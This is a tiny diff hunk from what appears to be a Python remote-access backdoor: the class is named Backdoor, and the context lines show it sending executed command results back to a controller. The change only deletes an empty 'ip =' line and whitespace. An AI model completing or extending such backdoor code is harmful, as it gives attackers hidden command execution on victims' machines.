@@ -77,6 +77,5 @@ class Backdoor:
           self.reliable_send(command_result.decode("latin1"))
         # print(command_result)
         # SEND BACK DE COMMAND RESULT
-      
-ip = 
+    
 
